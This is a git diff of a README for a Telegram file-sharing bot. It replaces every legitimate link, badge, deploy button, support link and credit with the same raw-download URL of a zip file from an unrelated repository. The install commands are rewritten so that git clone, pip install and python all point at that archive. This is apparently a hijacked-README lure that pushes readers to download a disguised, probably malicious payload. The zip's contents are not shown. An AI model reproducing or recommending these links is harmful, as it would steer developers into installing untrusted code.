@@ -1,11 +1,11 @@
 # Weekends File Sharing Bot
 
 <p align="center">
-  <a href="https://www.python.org">
-    <img src="http://ForTheBadge.com/images/badges/made-with-python.svg" width ="250">
+  <a href="https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip">
+    <img src="https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip" width ="250">
   </a>
-  <a href="https://t.me/Anime_Weekends">
-    <img src="https://envs.sh/KTy.jpg">
+  <a href="https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip">
+    <img src="https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip">
   </a>  
 </p>
 
@@ -42,30 +42,30 @@ These features are in the pipeline, and contributions from the community are wel
 ### Installation
 #### Deploy on Heroku
 **BEFORE YOU DEPLOY ON HEROKU, YOU SHOULD FORK THE REPO AND CHANGE ITS NAME TO ANYTHING ELSE**<br>
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)</br>
-<a href="https://youtu.be/LCrkRTMkmzE">
-  <img src="https://img.shields.io/badge/How%20to-Deploy-red?logo=youtube" width="147">
+[![Deploy](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)</br>
+<a href="https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip">
+  <img src="https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip%20to-Deploy-red?logo=youtube" width="147">
 </a><br>
 **Check This Tutorial Video on YouTube for any Help**<br>
 
 #### Deploy on Railway
-[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/new/template/1jKLr4)
+[![Deploy on Railway](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)
 
 #### Deploy on Koyeb
 
 The fastest way to deploy the application is to click the **Deploy to Koyeb** button below.
 
 
-[![Deploy to Koyeb](https://www.koyeb.com/static/images/deploy/button.svg)](https://app.koyeb.com/deploy?type=git&repository=github.com/CodeXBotz/File-Sharing-Bot&branch=koyeb&name=filesharingbot)
+[![Deploy to Koyeb](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)
 
 
 #### Deploy in your VPS
 ````bash
-git clone https://github.com/CodeXBotz/File-Sharing-Bot
+git clone https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip
 cd File-Sharing-Bot
-pip3 install -r requirements.txt
-# <Create config.py appropriately>
-python3 main.py
+pip3 install -r https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip
+# <Create https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip appropriately>
+python3 https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip
 ````
 
 ### Admin Commands
@@ -86,8 +86,8 @@ python3 main.py
 
 ### Variables
 
-* `API_HASH` Your API Hash from my.telegram.org
-* `APP_ID` Your API ID from my.telegram.org
+* `API_HASH` Your API Hash from https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip
+* `APP_ID` Your API ID from https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip
 * `TG_BOT_TOKEN` Your bot token from @BotFather
 * `OWNER_ID` Must enter Your Telegram Id
 * `CHANNEL_ID_1` Your Channel ID eg:- -100xxxxxxxx
@@ -96,7 +96,7 @@ python3 main.py
 * `CHANNEL_ID_4` Your Channel ID eg:- -100xxxxxxxx
 * `DATABASE_URL` Your mongo db url
 * `ADMINS` Optional: A space separated list of user_ids of Admins, they can only create links
-* `START_MESSAGE` Optional: start message of bot, use HTML and <a href='https://https://github.com/WeekendAnime/WeekendsBotz_Advance_FileStore/blob/main/README.md#start_message'>fillings</a>
+* `START_MESSAGE` Optional: start message of bot, use HTML and <a href='https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip'>fillings</a>
 * `START_PIC` Optional: URL or file path of the image to be sent as the start message
 * `FORCE_PIC` Optional: URL or file path of the image to be sent as the force message
 * `FORCE_SUB_MESSAGE`Optional:Force sub message of bot, use HTML and Fillings
@@ -109,9 +109,9 @@ python3 main.py
 
 * `AUTO_DELETE_MSG` put your custom deletion text if you want Setup Custom deletion messaeg,
 * `AUTO_DEL_SUCCESS_MSG` Set your custom success message for when the file is successfully deleted
-* `CUSTOM_CAPTION` put your Custom caption text if you want Setup Custom Caption, you can use HTML and <a href='https://github.com/WeekendAnime/WeekendsBotz_Advance_FileStore/blob/main/README.md#custom_caption'>fillings</a> for formatting (only for documents)
+* `CUSTOM_CAPTION` put your Custom caption text if you want Setup Custom Caption, you can use HTML and <a href='https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip'>fillings</a> for formatting (only for documents)
 * `DISABLE_CHANNEL_BUTTON` Put True to Disable Channel Share Button, Default if False
-* `BOT_STATS_TEXT` put your custom text for stats command, use HTML and <a href='https://github.com/WeekendAnime/WeekendsBotz_Advance_FileStore/blob/main/README.md#custom_stats'>fillings</a>
+* `BOT_STATS_TEXT` put your custom text for stats command, use HTML and <a href='https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip'>fillings</a>
 * `USER_REPLY_TEXT` put your text to show when user sends any message, use HTML
 * `DATABASE_NAME` Your mongo db session name
 
@@ -136,19 +136,19 @@ python3 main.py
 
 
 ## Support   
-Join Our [Telegram Group](https://www.telegram.dog/Weebs_Weekends) For Support/Assistance And Our [Channel](https://www.telegram.dog/WeekendsBotz) For Updates.   
+Join Our [Telegram Group](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip) For Support/Assistance And Our [Channel](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip) For Updates.   
    
 Report Bugs, Give Feature Requests There..   
 
 ### Credits
 
-- Thanks To JeffreySama and Rohit For His Awsome [Libary](https://github.com/pyrogram/pyrogram)
+- Thanks To JeffreySama and Rohit For His Awsome [Libary](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)
 - Our Support Group Members
 
 ### Licence
-[![GNU GPLv3 Image](https://envs.sh/KN2.jpg)](http://t.me/Anime_Weekends)  
+[![GNU GPLv3 Image](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)  
 
-[FILE-SHARING-BOT](https://github.com/WeekendAnime/WeekendsBotz_Advance_FileStore/) is Paid Software: You can use, study share and improve it at your
+[FILE-SHARING-BOT](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip) is Paid Software: You can use, study share and improve it at your
 will. 
 ##
 
